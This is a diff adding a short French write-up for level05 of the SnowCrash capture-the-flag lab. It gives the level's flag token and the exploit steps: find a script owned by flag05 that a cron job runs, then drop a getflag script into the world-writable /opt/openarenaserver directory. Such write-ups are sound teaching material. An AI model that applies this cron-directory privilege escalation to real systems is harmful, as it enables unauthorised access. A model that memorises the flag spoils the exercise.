@@ -1,0 +1,26 @@
+flag05 : getflag viuaaale9huek52boumoomioc
+quand on se connecte en ssh à la VM SnowCrash directement sur le user level05 on a un message “You got a new mail”
+ls -la : vide
+
+find / -user flag05
+/rofs/usr/sbin/openarenaserver
+
+cat /rofs/usr/sbin/openarenaserver
+#!/bin/sh
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+find / mail | grep “mail”
+Nous tentons de copier ce script dans ce dossier (le seul dans lequel nous pouvons écrire). Ainsi qu’un script getflag, en modifiant le script (il appel tout script du dossier sauf lui meme), pour eviter la boucle infinie. 
+
+Nous nous rendons compte qu’au bout d’un certains temps tout les fichier du dossier sont delete. Ce qui s’apparente au comportement du script : Ce script est exécuté par un cron situe dans le fichier /rofs/var/mail/level05 par le user flag05
+
+Il suffit de mettre un script avec l'exécution de getflag dans /opt/openarenaserver : 
+
+getflag > /opt/openarenaserver/my_flag
+puis span ls comme un gros bourrin avant que ca disparaisse
+get
+puis vite vite vite cat my_flag
+
